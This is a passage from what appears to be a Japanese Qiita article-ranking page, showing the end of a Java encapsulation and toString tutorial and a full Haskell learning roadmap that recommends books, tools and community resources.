    <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span> <span class="o">+</span> <span class="n">duration</span><span class="o">.</span><span class="na">getDayNum</span><span class="o">();</span>

    <span class="c1">//DAY_OF_MONTH(30)日は1ヶ月換算</span>
    <span class="k">this</span><span class="o">.</span><span class="na">monthNum</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">monthNum</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span><span class="o">/</span><span class="n">DAY_OF_MONTH</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span> <span class="o">%</span> <span class="n">DAY_OF_MONTH</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="c1">//ユーザーはセットはできないが取得はできるようにpublic（公開）にする</span>
  <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getMonthNum</span><span class="o">(){</span>
    <span class="k">return</span> <span class="n">monthNum</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getDayNum</span><span class="o">(){</span>
    <span class="k">return</span> <span class="n">dayNum</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">(){</span>
      <span class="k">return</span> <span class="o">(</span><span class="n">monthNum</span><span class="o">/</span><span class="mi">12</span><span class="o">)+</span><span class="s">"年"</span><span class="o">+(</span><span class="n">monthNum</span><span class="o">%</span><span class="mi">12</span><span class="o">)+</span><span class="s">"ヶ月"</span><span class="o">+</span><span class="n">dayNum</span><span class="o">+</span><span class="s">"日"</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</div>

<p>コード中にも書いてますが、解説を加えていきます。<br>
まず期間を表すクラスなので何ヶ月何日かを保持するため<code>monthNum</code>, <code>dayNum</code>フィールドを保持してますが、コンストラクタや<code>add()</code>メソッドでは<code>dayNum</code>が30を超えてもそれを自動的に1ヶ月換算するように制御をかけています。そのため、ユーザーがこの制御を破って勝手に<code>dayNum</code>に30以上の数を入れないようにprivate（非公開）にしています。一方取得自体は自由にしてもらって構わないため、<code>getMonthNum()</code>, <code>getDayNum()</code>メソッドはpublic（公開）にしています（<strong>カプセル化</strong>）。<br>
次に、「1ヶ月とみなす日数」は期間にかかわらず30日固定で共通のため、<code>DAY_OF_MONTH</code>は<a href="https://qiita.com/lamrongol/items/74f62fcbea9cf7e96c4d#final%E4%BF%AE%E9%A3%BE%E5%AD%90" id="reference-cd762fcb6045e78fa093">final</a>で<a href="https://qiita.com/lamrongol/items/74f62fcbea9cf7e96c4d#static%E4%BF%AE%E9%A3%BE%E5%AD%90" id="reference-cd762fcb6045e78fa093">static（静的）</a>にしています。そして何日間を1ヶ月と換算するかはユーザーにわかるようにしたいため、public（公開）にしています。<br>
最後に、<code>toString()</code>メソッドを実装しています。Javaは全てのクラスがObjectクラスを継承していて、<code>toString()</code>はそれが持っているメソッドです。これを実装することで自分が作成したクラスでもデバッグモードや<code>System.out.println(obj);</code>で人間が見たときにわかりやすいように表示されます。<code>toString()</code>というメソッドは共通していてどのように表示するかはクラスによって実装が異なるので一種の<strong>ポリモーフィズム</strong>です。</p>

<h1>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h1>

<p>最初の方にも書いたようにプログラミングで重要なのは<strong>「他人（将来の自分含む）が読み書きしやすいコードを書く」</strong>ことです。オブジェクト指向に限らずプログラミング技法を学ぶときやプログラムを書くときは「それは本当に他人（将来の自分含む）が読めて改変が容易なコードか？」を考えるようにしてください。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">48位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>199</kbd>
		<a target="_blank" href="https://qiita.com/Lugendre/items/70e517e59698e0e435f5">Haskellの入門から中級者になるまでの指針</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-05<br />20:00:59</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/205061.html">Lugendre</a>(1件の記事)<br><img width="80" height="80" src="https://avatars3.githubusercontent.com/u/28984959?v=4">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Haskell]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>プログラミング言語の学習は一般に大変である。<br>
最初にどのようなことをすればいいのか、どの本をよむべきなのか等疑問は尽きない。マイナーな言語で情報が少なければなおさらである。<br>
この記事では諸事情でHaskellに入門することになった方にむけて、どのように勉強していくか、参考にすべき本や記事を紹介する。<br>
より良い指針にするためにも、指摘、感想等はコメントや私のTwitterアカウント(<a href="/Lugendre" class="user-mention js-hovercard" title="Lugendre" data-hovercard-target-type="user" data-hovercard-target-name="Lugendre">@Lugendre</a>)に投稿して頂けるとありがたい。</p>

<h1>
<span id="入門初心者" class="fragment"></span><a href="#%E5%85%A5%E9%96%80%E5%88%9D%E5%BF%83%E8%80%85"><i class="fa fa-link"></i></a>入門〜初心者</h1>

<h2>
<span id="環境構築" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89"><i class="fa fa-link"></i></a>環境構築</h2>

<p>まずどんなプログラミング言語においても、プログラミングをする環境が必要である。Haskellにおいては <strong>Stack</strong>と呼ばれるツールをインストールすることによって、コンパイラ(GHC)、モジュールのインストール、ビルドなど自動でやってくれるようになるので、とりあえず脳死でStackをインストールしておけば良い。<br>
以下の<a href="/igrep" class="user-mention js-hovercard" title="igrep" data-hovercard-target-type="user" data-hovercard-target-name="igrep">@igrep</a>さんの記事が参考にすると良い。<br>
<a href="https://qiita.com/igrep/items/da1d8df6d40eb001a561" id="reference-ff0068c2eae469e06ed7">Stackでやる最速Haskell Hello world! (GHCのインストール付き！)</a></p>

<p>他にも<a href="http://amzn.asia/cjNcHXP" rel="nofollow noopener" target="_blank">Haskell 教養としての関数型プログラミング</a>や先日発売した<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>にも詳しく書いてある。</p>

<p>Haskellには優れたIDEとして広く知られているものはない。どうしても優れたIDEで開発したいというのならば自分で作るしか無いのが現状である。よって現状の開発環境としては自分の好きなテキストエディタとStackで十分である。好きなテキストエディタが無いのであればAtomを利用するのが良いだろう。</p>

<p>また、Haskellらしいきれいなコードを意識するためにも <strong>stylish-haskell</strong> や <strong>hlint</strong> を使うことを強くおすすめする。<br>
これらのツールはStackよりインストールできる。詳しくは<a href="/ncaq" class="user-mention js-hovercard" title="ncaq" data-hovercard-target-type="user" data-hovercard-target-name="ncaq">@ncaq</a>さんの以下の記事を参考されたし。<br>
<a href="https://www.ncaq.net/2017/10/07/" rel="nofollow noopener" target="_blank">2017-10-07<br>
Haskellを書くときはstylish-haskellとhlintを使って労せずして綺麗なコードを書きましょう</a></p>

<h2>
<span id="基本的な文法考え方について知る" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E6%96%87%E6%B3%95%E8%80%83%E3%81%88%E6%96%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E7%9F%A5%E3%82%8B"><i class="fa fa-link"></i></a>基本的な文法、考え方について知る</h2>

<p>Haskell入門の鉄板本である<a href="http://amzn.asia/2RhgBDl" rel="nofollow noopener" target="_blank">すごいHaskellたのしく学ぼう！</a>(通称すごいH本)を読むのが良い。ネット上の下手なHaskell入門記事を読むよりもこれを読もう。お金がないのであれば、<a href="http://learnyouahaskell.com/chapters" rel="nofollow noopener" target="_blank">英語版</a>を読むと良い。ここで注意すべきはすごいH本は環境構築のお話が若干古いので、参考にしないこと。<br>
加えて、<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>も必読である。名前に反し、すごいH本よりも若干高度な内容が扱われているが、Haskellを実践で扱うのに必要な内容が余すことなく書いてある。<br>
Haskellにおける関数型プログラミングの考え方になれるためにも、手を動かしながら読むと良い。<br>
わからないところがあれば後に紹介するHaskell-jpのSlackやTwitterで質問をすると初心者に飢えたHaskellerたちがこぞって教えてくれる。</p>

<h2>
<span id="モナドについて" class="fragment"></span><a href="#%E3%83%A2%E3%83%8A%E3%83%89%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>モナドについて</h2>

<p>度々話題になるモナドについてだが、基本的には具体的なモナド(StateやMaybe, IOなど)をただ使えるようになれば良い。数学の圏論の話などはまったく知らなくて良い。<sup id="fnref1"><a href="#fn1" rel="footnote" title="私はいずれは知るべきだと考えているが、すくなくともこの段階で知るべきことではない。">1</a></sup>すごいH本を読んで行けば具体的な使い方が出てくるので、一緒に手を動かしながら使い方を学ぶと良い。残念ながら <strong>すごいH本だけではモナドに関して十分な理解は得られない。</strong> <a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>も同時に参照するとよい。</p>

<h2>
<span id="演習簡単なものを作ってみる" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92%E7%B0%A1%E5%8D%98%E3%81%AA%E3%82%82%E3%81%AE%E3%82%92%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>[演習]簡単なものを作ってみる</h2>

<p>ここらまで来たらちょっとした演習としてパーサーコンビネータを作ってみよう。これは題材として非常に優秀で、基本的なモナドの使い方とその威力を体感することができる。<a href="http://amzn.asia/d4uxed3" rel="nofollow noopener" target="_blank">Haskellによる関数プログラミングの思考法</a>(IFPH)の11章や<a href="http://www.geocities.jp/m_hiroi/func/haskell32.html" rel="nofollow noopener" target="_blank">お気楽Haskellプログラミング入門</a>や<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>を参考にすると良い。</p>

<p>ここまで来たら初心者卒業と言っても良いだろう。おめでとう！</p>

<h1>
<span id="脱初心者を目指す" class="fragment"></span><a href="#%E8%84%B1%E5%88%9D%E5%BF%83%E8%80%85%E3%82%92%E7%9B%AE%E6%8C%87%E3%81%99"><i class="fa fa-link"></i></a>脱初心者を目指す</h1>

<h2>
<span id="実践的内容を知る" class="fragment"></span><a href="#%E5%AE%9F%E8%B7%B5%E7%9A%84%E5%86%85%E5%AE%B9%E3%82%92%E7%9F%A5%E3%82%8B"><i class="fa fa-link"></i></a>実践的内容を知る</h2>

<p>残念ながら、上記の内容だけではHaskellで実践的なプログラミングはできない。ここでは実践的なプログラミングに必要な幾つかの要素を紹介する。</p>

<p>複数のモナドを扱うのに必要な <strong>モナド変換子</strong> は<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>で詳しく紹介されている。<a href="/7shi" class="user-mention js-hovercard" title="7shi" data-hovercard-target-type="user" data-hovercard-target-name="7shi">@7shi</a>さんの<a href="https://qiita.com/7shi/items/4408b76624067c17e933" id="reference-e9dfc5f30ef8b56039e7">Haskell モナド変換子超入門</a>も良いだろう。<br>
また、<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>は各モナドの使い分けや使用方法に関しても詳しく載っている。一度目を通しておくべきだ。</p>

<p>また、標準ライブラリやよく使うライブラリ、フレームワークについても知っておくべきだろう。これに関しても<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>によくまとめられている。<br>
特に <strong>Lens/Prism</strong>はHaskellで複雑なデータ構造を扱う上で欠かせない。<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>でも紹介されているが、Lensの最低限の使い方のみであるがこの段階ではそれで十分だろう。<br>
他にもテストは<strong>doctest</strong>, <strong>QuickCheck</strong>, <strong>Hspec</strong>, <strong>HUnit</strong>がある。テストフレームワークとしては<strong>test-framework</strong>がある。QuickCheckは<a href="http://amzn.asia/0viF1bE" rel="nofollow noopener" target="_blank">関数プログラミングの楽しみ</a>や<a href="http://amzn.asia/fMnNyyE" rel="nofollow noopener" target="_blank">関数プログラミング実践入門</a>で、doctestは<a href="http://amzn.asia/fMnNyyE" rel="nofollow noopener" target="_blank">関数プログラミング実践入門</a>で, HUnitは<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>で取り上げられている。test-frameworkやHspecなどはライブラリのドキュメントを見ると良いだろう。</p>

<p><strong>遅延評価</strong> はプログラミングのパフォーマンスに直結する。適度に正格評価をしてやる必要があるが、当然デメリットも有る。GHCと遅延評価の話題に関しては<a href="http://amzn.asia/d4uxed3" rel="nofollow noopener" target="_blank">Haskellによる関数プログラミングの思考法</a>(IFPH)やGHCの公式ドキュメント、反駁不可パターンなどは<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>を参照すると良い。</p>

<h2>
<span id="演習webアプリケーションを作ってみる" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92web%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>[演習]Webアプリケーションを作ってみる</h2>

<p>ここまでの知識を用いて実践的なプログラミングとして、Webアプリケーションを作ってみるのは良い練習になる。<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>では最後にWebアプリケーションを作っているので、一緒に作っているのが良いだろう。関数プログラミングの基礎的な考え方も身につく。</p>

<p>ここまでできれば中級者だ。実践的なプログラミングも十分に可能だろう。</p>

<h2>
<span id="並列並行プログラミング" class="fragment"></span><a href="#%E4%B8%A6%E5%88%97%E4%B8%A6%E8%A1%8C%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>並列・並行プログラミング</h2>

<p>Haskellは並列・並行プログラミングが得意であると言われている。<br>
これらに関しては<a href="http://amzn.asia/dZIoGJ7" rel="nofollow noopener" target="_blank">Haskell入門</a>、<a href="http://amzn.asia/3VgbyYr" rel="nofollow noopener" target="_blank">Haskellによる並列・並行プログラミング</a>を参照すると良い。</p>

<h1>
<span id="更に深くおまけ" class="fragment"></span><a href="#%E6%9B%B4%E3%81%AB%E6%B7%B1%E3%81%8F%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>更に深く(おまけ)</h1>

<p>Haskellを極めたい、更に深く知りたいという方に対する指針。</p>

<h2>
<span id="データ構造とアルゴリズム" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E6%A7%8B%E9%80%A0%E3%81%A8%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0"><i class="fa fa-link"></i></a>データ構造とアルゴリズム</h2>

<p>関数型言語には関数型言語のデータ構造とアルゴリズムがある。<a href="http://amzn.asia/hFHLLoy" rel="nofollow noopener" target="_blank">純粋関数型データ構造</a><sup id="fnref2"><a href="#fn2" rel="footnote" title="残念ながらHaskellで書かれていない.">2</a></sup>や<a href="http://amzn.asia/6N5w9B5" rel="nofollow noopener" target="_blank">関数プログラミング 珠玉のアルゴリズムデザイン</a>を読むと良い。</p>

<h2>
<span id="関数プログラミングの考え方を学ぶ" class="fragment"></span><a href="#%E9%96%A2%E6%95%B0%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AE%E8%80%83%E3%81%88%E6%96%B9%E3%82%92%E5%AD%A6%E3%81%B6"><i class="fa fa-link"></i></a>関数プログラミングの考え方を学ぶ</h2>

<p><a href="http://amzn.asia/0viF1bE" rel="nofollow noopener" target="_blank">関数プログラミングの楽しみ</a>はHaskellによる関数プログラミングの事例が多く載っている。また、Haskellのテスト方法やArrowと言った非常に便利な型クラスの使い方も詳しく載っている。Haskellerならぜひ一度読んでおくべきである。<br>
練習問題も豊富なので、腕試しとしても使える。</p>

<h2>
<span id="ghc拡張について" class="fragment"></span><a href="#ghc%E6%8B%A1%E5%BC%B5%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>GHC拡張について</h2>

<p>GHC拡張とは, Haskellの言語仕様にはない機能を提供するGHCの言語拡張である。ほぼ必須なものから使い所がわからないものまで多種多様である。それぞれの使用方法とモチベーションはGHCの公式ドキュメントや<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>に書いてある。よく使う、話題に上がる拡張については別記事で紹介、または追記する。<sup id="fnref3"><a href="#fn3" rel="footnote" title="多分紹介する。多分">3</a></sup></p>

<h2>
<span id="型システムと意味論" class="fragment"></span><a href="#%E5%9E%8B%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%A8%E6%84%8F%E5%91%B3%E8%AB%96"><i class="fa fa-link"></i></a>型システムと意味論</h2>

<p>関数プログラミング(特にHaskell)は意味論や型システムと密接な関わりがある。またいくつかのよく使われるGHC拡張には型システムの知識を要求するものがある。これらを知っておくことはHaskellだけでなく他のプログラミングに於いても有用だろう。型システムや操作的意味論、λ計算の基本は<a href="http://amzn.asia/6Q1Gd9x" rel="nofollow noopener" target="_blank">型システム入門</a>で、カテゴリ理論を含む各種意味論は<a href="http://amzn.asia/dbMhj4K" rel="nofollow noopener" target="_blank">プログラム意味論</a>で学ぶことができる。<br>
Hindley-Milner型システムに関しては知っておく必要があるだろう。</p>

<h3>
<span id="演習型で遊ぶ" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92%E5%9E%8B%E3%81%A7%E9%81%8A%E3%81%B6"><i class="fa fa-link"></i></a>[演習]型で遊ぶ</h3>

<p>これらで学んだ部分型や全称型、存在型、依存型、高階多相などはGHC拡張などを用いてすぐに試すことができる。<br>
Haskellで試しながら読み進めていくと良い。<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>では型システム入門よりも発展的な話題についても紹介されている。<br>
HaskellとGHC拡張による型レベルプログラミングの記事を探しても良いだろう。</p>

<h2>
<span id="圏論" class="fragment"></span><a href="#%E5%9C%8F%E8%AB%96"><i class="fa fa-link"></i></a>圏論</h2>

<p>Haskellと圏論の関わりは深い。Hackageなどのライブラリの説明に平然と圏論の用語が出てくることも多い。圏論については<a href="http://amzn.asia/hmEqpbh" rel="nofollow noopener" target="_blank">圏論 原著</a>や<a href="http://amzn.asia/0tPSJci" rel="nofollow noopener" target="_blank">圏論の基礎</a>を読むと良い。併せて<a href="https://sites.google.com/site/klovelab/Home/category" rel="nofollow noopener" target="_blank">圏論.hs</a>のスライドや動画を参照するとHaskellとの関連性がわかる。<br>
HaskellでもCategoryとかArrowとかProfunctorとかBifunctorとか山ほどある。<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>を参照されたし。<sup id="fnref4"><a href="#fn4" rel="footnote" title="困ったことに書きかけだが。">4</a></sup></p>

<h3>
<span id="演習圏論が背景にあるライブラリを作って遊ぶ" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92%E5%9C%8F%E8%AB%96%E3%81%8C%E8%83%8C%E6%99%AF%E3%81%AB%E3%81%82%E3%82%8B%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%82%92%E4%BD%9C%E3%81%A3%E3%81%A6%E9%81%8A%E3%81%B6"><i class="fa fa-link"></i></a>[演習]圏論が背景にあるライブラリを作って遊ぶ</h3>

<p>有用性や新規性はおいておいて、圏論にある概念をHaskellで書くことができるかチャレンジしてみると良い。</p>

<h2>
<span id="lensprism" class="fragment"></span><a href="#lensprism"><i class="fa fa-link"></i></a>Lens/Prism</h2>

<p>Lens/Prismに関して更に詳しい情報が知りたければ<a href="/igrep" class="user-mention js-hovercard" title="igrep" data-hovercard-target-type="user" data-hovercard-target-name="igrep">@igrep</a>さんの<a href="http://the.igreque.info/posts/2015-06-09-lens-prism.html" rel="nofollow noopener" target="_blank">Lens&amp;Prism勉強会 私的まとめ</a>に様々な記事、スライドが紹介されている。他にはソースコードを読むくらいしか……<sup id="fnref5"><a href="#fn5" rel="footnote" title="圏論による形式化の論文があった気がするのだが見つからない。">5</a></sup></p>

<h2>
<span id="もっとモナド" class="fragment"></span><a href="#%E3%82%82%E3%81%A3%E3%81%A8%E3%83%A2%E3%83%8A%E3%83%89"><i class="fa fa-link"></i></a>もっとモナド</h2>

<p>(Haskellにおける)モナドをちゃんと知りたいならば、<a href="http://amzn.asia/0viF1bE" rel="nofollow noopener" target="_blank">関数プログラミングの楽しみ</a>のArrowの章を読んだり、<a href="http://www.cs.cmu.edu/%7Ecrary/819-f09/Moggi91.pdf" rel="nofollow noopener" target="_blank">Notions of computation and monads</a>を読むと良い。<a href="/hiruberuto" class="user-mention js-hovercard" title="hiruberuto" data-hovercard-target-type="user" data-hovercard-target-name="hiruberuto">@hiruberuto</a>さんの<a href="https://qiita.com/hiruberuto/items/8bbc0343bf794c368287" id="reference-a3243b5e7ca6557fce24">モナドはポケモン。数学が出てこないモナド入門</a>も参考になる。<br>
FreeモナドやOperationalモナドを使えると便利である。<a href="/fumieval" class="user-mention js-hovercard" title="fumieval" data-hovercard-target-type="user" data-hovercard-target-name="fumieval">@fumieval</a>さんの<a href="http://fumieval.hatenablog.com/entry/2013/05/09/223604#f2" rel="nofollow noopener" target="_blank">Freeモナドを超えた!?operationalモナドを使ってみよう</a>で説明されている。</p>

<p>他にもMonad Morphismについて知るのも有用だ。<a href="https://hackage.haskell.org/package/mmorph-1.1.0/docs/Control-Monad-Morph.html" rel="nofollow noopener" target="_blank">Control.Monad.MMorph</a>や<a href="/hiratara" class="user-mention js-hovercard" title="hiratara" data-hovercard-target-type="user" data-hovercard-target-name="hiratara">@hiratara</a>さんの<a href="https://qiita.com/hiratara/items/65fcf38070def7e5a918" id="reference-9a2194c53bf5e82b9f8a">モナドモナド (LT没ネタ)</a>を参照すると良い。</p>

<h3>
<span id="演習モナドを作る" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92%E3%83%A2%E3%83%8A%E3%83%89%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>[演習]モナドを作る</h3>

<p>この計算ってモナドとして抽象化できるのではと感じたら積極的に試してみよう。<br>
過去に書いたコードをリファクタリングするのも勉強になる。</p>

<h2>
<span id="extensible-effect" class="fragment"></span><a href="#extensible-effect"><i class="fa fa-link"></i></a>Extensible Effect</h2>

<p>モナド変換子は合成するモナドの数が多いほど効率が悪くなるなどの問題点がある。そこで、モナドではなくEffect Systemを用いた計算の表現を使う方法もある。詳しくは<a href="http://konn-san.com/prog/haskell/extensible-effects.html" rel="nofollow noopener" target="_blank">Extensible Effects はモナド変換子に対する救世主になり得るか?</a>を参照されたし。<br>
Effect systemについて知りたければ<a href="http://web.cs.ucla.edu/%7Epalsberg/tba/papers/nielson-nielson-csd99.pdf" rel="nofollow noopener" target="_blank">Type and Effect system</a>という論文を読むと良い。</p>

<h3>
<span id="演習モナド変換子をextensible-effectに置き換える" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92%E3%83%A2%E3%83%8A%E3%83%89%E5%A4%89%E6%8F%9B%E5%AD%90%E3%82%92extensible-effect%E3%81%AB%E7%BD%AE%E3%81%8D%E6%8F%9B%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>[演習]モナド変換子をExtensible Effectに置き換える</h3>

<p>今まで書いたコードのモナド変換子をExtensible Effectに置き換えてみよう。</p>

<h2>
<span id="arrowとarrow記法" class="fragment"></span><a href="#arrow%E3%81%A8arrow%E8%A8%98%E6%B3%95"><i class="fa fa-link"></i></a>ArrowとArrow記法</h2>

<p>関数プログラミングにおいては、関数のような小さな計算の集まりを合成してプログラムを作るという考え方がある。これを強力にサポートするものとしてArrow型クラスとGHC拡張のArrowsがある。これはGUIのような反応状況モデルと相性が良い。これに関してはGHCの公式ドキュメントと<a href="http://amzn.asia/0viF1bE" rel="nofollow noopener" target="_blank">関数プログラミングの楽しみ</a>を読むと良い。</p>

<h2>
<span id="融合変換" class="fragment"></span><a href="#%E8%9E%8D%E5%90%88%E5%A4%89%E6%8F%9B"><i class="fa fa-link"></i></a>融合変換</h2>

<p>一般に効率と可読性、保守し易さはトレードオフの関係にある。我々としては可読性が高く、保守しやすいコードを自動で効率のよいコードに変換してほしい。こういった際に融合変換による最適化は有用である。詳しくは<a href="http://amzn.asia/0viF1bE" rel="nofollow noopener" target="_blank">関数プログラミングの楽しみ</a>を読むと良い。</p>

<h2>
<span id="ffi" class="fragment"></span><a href="#ffi"><i class="fa fa-link"></i></a>FFI</h2>

<p>HaskellではC言語の関数を呼び出すことができる。型安全性が保たれるのかとかなどは私もあまり良くわかっていない。<a href="http://dev.stephendiehl.com/hask/" rel="nofollow noopener" target="_blank">WHAT I WISH I KNEW WHEN LEARNING HASKELL</a>に一応書いてある。</p>

<h2>
<span id="unsafehaskell" class="fragment"></span><a href="#unsafehaskell"><i class="fa fa-link"></i></a>unsafeHaskell</h2>

<p>GHC拡張などの中にはHaskellの型システムを破壊しうる関数があり、そういった関数はunsafeという接頭辞が付いている。基本的にこれらを使うと深い悲しみに包まれることになるので使わない方が良い。SafeHaskell拡張を使えばこれらを抑制できる。<sup id="fnref6"><a href="#fn6" rel="footnote" title="困ったことにTemplate Haskellも使えなくなる。">6</a></sup></p>

<h2>
<span id="haskellでオブジェクト指向プログラミングしたい" class="fragment"></span><a href="#haskell%E3%81%A7%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E6%8C%87%E5%90%91%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%97%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>Haskellでオブジェクト指向プログラミングしたい！</h2>

<p>基本的にHaskellでOOPをする必要性はないのだが、ゲームの制作などの限られた領域ではOOPは便利である。HaskellでOOPをするにあたって<strong>objective</strong>というライブラリを使うと良い。<a href="/its_out_of_tune" class="user-mention js-hovercard" title="its_out_of_tune" data-hovercard-target-type="user" data-hovercard-target-name="its_out_of_tune">@its_out_of_tune</a>さんの<a href="http://tune.hateblo.jp/entry/2015/03/27/035648" rel="nofollow noopener" target="_blank">Haskellオブジェクト指向に触れてみよう〜初級編〜</a>や生みの親の<a href="/fumieval" class="user-mention js-hovercard" title="fumieval" data-hovercard-target-type="user" data-hovercard-target-name="fumieval">@fumieval</a>さんの<a href="https://fumieval.github.io/papers/ja/2015-Haskell-objects.pdf" rel="nofollow noopener" target="_blank">Haskellでの合成可能なオブジェクトの構成とその応用</a>を参考すると良い。他にも純粋関数型オブジェクト指向<sup id="fnref7"><a href="#fn7" rel="footnote" title="Haskell++とかO'Haskellとかもあるけども……">7</a></sup>に関しては<a href="http://amzn.asia/6Q1Gd9x" rel="nofollow noopener" target="_blank">型システム入門</a>でテーマとして取り扱っている。</p>

<h2>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a>その他</h2>

<p>LiquidHaskell<sup id="fnref8"><a href="#fn8" rel="footnote" title="入門LiquidHaskell−篩型による静的コード解析−はLiquidHaskellに関する唯一(?)の本。">8</a></sup>を使った静的コード解析や定理証明やらも有用。形式手法については知っていたほうが良いだろう。<sup id="fnref9"><a href="#fn9" rel="footnote" title="ここらへんに関しては目下勉強中なもんで。">9</a></sup> 圏論データベースの話も面白い。</p>

<p>ここまで来たら後は様々なコードを読んでイディオムを学んでいくと良い。</p>

<h3>
<span id="演習elmコンパイラを読む" class="fragment"></span><a href="#%E6%BC%94%E7%BF%92elm%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9%E3%82%92%E8%AA%AD%E3%82%80"><i class="fa fa-link"></i></a>[演習]Elmコンパイラを読む</h3>

<p>これらの知識があればElmのコンパイラのソースコードを読むことが可能だろう。Elmのコンパイラで肩慣らしをしてからGHCのソースコードを読んでみてもよい。ElmやHaskellの言語仕様のみのインタプリタを実装しても良い。</p>

<h1>
<span id="今すぐ参加すべきコミュニティ" class="fragment"></span><a href="#%E4%BB%8A%E3%81%99%E3%81%90%E5%8F%82%E5%8A%A0%E3%81%99%E3%81%B9%E3%81%8D%E3%82%B3%E3%83%9F%E3%83%A5%E3%83%8B%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>今すぐ参加すべきコミュニティ</h1>

<p><a href="https://haskell.jp/" rel="nofollow noopener" target="_blank">Haskell-jp</a>という日本のHaskellerの集まりがある。逆引き辞典や査読付きなので信頼性の高いHaskellの記事がある。誰でも参加できるSlackチームもあり、無限にHaskellの情報が流れてくるは、強いHaskellerたちに質問できるので今すぐ参加しよう！</p>

<h2>
